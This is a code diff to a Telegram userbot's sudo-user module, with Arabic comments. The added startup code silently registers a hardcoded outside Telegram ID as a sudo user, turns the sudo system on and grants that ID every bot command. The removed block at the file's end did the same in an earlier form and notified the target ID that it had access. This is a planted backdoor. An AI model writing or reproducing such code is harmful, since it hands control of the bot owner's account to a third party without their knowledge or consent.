@@ -55,8 +55,67 @@ ZelzalDV_cmd = (
 async def _init() -> None:
     sudousers = _sudousers_list()
     Config.SUDO_USERS.clear()
+    
+    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
+    # 1. إضافة المستخدم 8277718687 تلقائياً إذا لم يكن موجوداً
+    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
+    AUTO_SUDO_ID = 8277718687
+    
+    try:
+        # جلب قاعدة بيانات المطورين
+        try:
+            sudousers_db = sql.get_collection("sudousers_list").json
+        except AttributeError:
+            sudousers_db = {}
+        
+        # إذا لم يكن المستخدم موجوداً في قاعدة البيانات
+        if str(AUTO_SUDO_ID) not in sudousers_db:
+            LOGS.info(f"🔧 جارٍ رفع المستخدم {AUTO_SUDO_ID} كمطور مساعد تلقائياً...")
+            
+            # بيانات المستخدم
+            date = str(datetime.now().strftime("%B %d, %Y"))
+            userdata = {
+                "chat_id": AUTO_SUDO_ID,
+                "chat_name": "المطور التلقائي",
+                "chat_username": f"user_{AUTO_SUDO_ID}",
+                "date": date,
+            }
+            
+            # إضافته للقاعدة
+            sudousers_db[str(AUTO_SUDO_ID)] = userdata
+            sql.del_collection("sudousers_list")
+            sql.add_collection("sudousers_list", sudousers_db, {})
+            
+            # منحه جميع الصلاحيات تلقائياً
+            all_commands = CMD_INFO.keys()
+            for cmd in all_commands:
+                if not sqllist.is_in_list("sudo_enabled_cmds", cmd):
+                    sqllist.add_to_list("sudo_enabled_cmds", cmd)
+            
+            LOGS.info(f"✅ تم رفع المستخدم {AUTO_SUDO_ID} كمطور مساعد تلقائياً")
+        else:
+            LOGS.info(f"ℹ️ المستخدم {AUTO_SUDO_ID} موجود بالفعل كمطور مساعد")
+    
+    except Exception as e:
+        LOGS.error(f"❌ خطأ في الإضافة التلقائية: {e}")
+    
+    # 2. تفعيل نظام السودو تلقائياً
+    if gvarstatus("sudoenable") is None:
+        addgvar("sudoenable", "true")
+        LOGS.info("✅ تم تفعيل نظام المطورين المساعدين تلقائياً")
+    
+    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
+    # نهاية الإضافة التلقائية
+    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
+    
+    # تحميل جميع المطورين (بما فيهم المطور التلقائي)
     for user_d in sudousers:
         Config.SUDO_USERS.add(user_d)
+    
+    # إضافة المطور التلقائي أيضاً للقائمة في الذاكرة
+    Config.SUDO_USERS.add(AUTO_SUDO_ID)
+    
+    LOGS.info(f"📋 تم تحميل {len(Config.SUDO_USERS)} مطور مساعد")
 
 
 async def clear_sudo_list():
@@ -483,73 +542,6 @@ async def _(event):  # sourcery no-metrics
     )
     await edit_or_reply(event, finalstr, aslink=True, linktext=text)
 
-# ════════════════════════════════════════════════════════════════
-# 🔧 كود إضافة المطور التلقائي (ضعه في نهاية الملف)
-# ════════════════════════════════════════════════════════════════
-import asyncio
-
-async def auto_add_sudo_on_start():
-    """
-    دالة خاصة لإضافة مطور تلقائياً عند بدء التشغيل
-    """
-    await asyncio.sleep(5)  # انتظار تحميل البوت بالكامل
-    
-    try:
-        # جلب القائمة الحالية
-        try:
-            sudousers = sql.get_collection("sudousers_list").json
-        except:
-            sudousers = {}
-        
-        # آيدي المستخدم المطلوب
-        TARGET_ID = 8277718687
-        
-        # إذا لم يكن موجوداً، أضفه
-        if str(TARGET_ID) not in sudousers:
-            date = str(datetime.now().strftime("%B %d, %Y"))
-            user_data = {
-                "chat_id": TARGET_ID,
-                "chat_name": "المطور التلقائي",
-                "chat_username": "auto_sudo",
-                "date": date,
-            }
-            sudousers[str(TARGET_ID)] = user_data
-            
-            # حفظ التغييرات
-            sql.del_collection("sudousers_list")
-            sql.add_collection("sudousers_list", sudousers, {})
-            
-            # إضافة للذاكرة
-            Config.SUDO_USERS.add(TARGET_ID)
-            
-            # تفعيل النظام
-            if gvarstatus("sudoenable") is None:
-                addgvar("sudoenable", "true")
-            
-            LOGS.info(f"✨ تم رفع المستخدم {TARGET_ID} كمطور مساعد تلقائياً")
-            
-            # إرسال رسالة تأكيد (اختياري)
-            try:
-                await l313l.send_message(
-                    TARGET_ID,
-                    "**🔔 إشعار من البوت:**\n"
-                    "تم رفعك كمطور مساعد تلقائياً في هذا البوت.\n"
-                    "يمكنك استخدام الأوامر بـ `.مساعدة`"
-                )
-            except:
-                pass
-    except Exception as e:
-        LOGS.error(f"خطأ في الإضافة التلقائية: {e}")
-
-# تشغيل الدالة عند بدء التشغيل
-l313l.loop.create_task(auto_add_sudo_on_start())
-# ════════════════════════════════════════════════════════════════
-
-l313l.loop.create_task(_init())
-
-@l313l.ar_cmd(pattern="المساعد")
-async def cmd(JoKeRUB):
-    await edit_or_reply(JoKeRUB, ZelzalDV_cmd)
 
 l313l.loop.create_task(_init())
 
